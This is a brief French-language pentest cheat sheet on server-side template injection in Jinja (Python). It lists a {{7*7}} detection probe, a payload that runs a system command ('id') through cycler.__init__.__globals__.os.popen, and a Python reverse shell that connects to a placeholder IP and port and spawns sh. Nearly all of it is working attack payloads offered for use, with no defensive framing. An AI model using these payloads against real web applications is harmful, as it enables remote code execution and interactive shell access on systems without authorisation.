# SSTI

### Jinja (python)

* Tester si la vulnérabilité est présente :

```
{{7*7}}
```

* Exploiter la vulnérabilité :

```python
# Reverse Shell
{{ cycler.__init__.__globals__.os.popen('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'').read()}}

# Exécuter une commande système
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**Tips :** essayer `python` et `python3`.
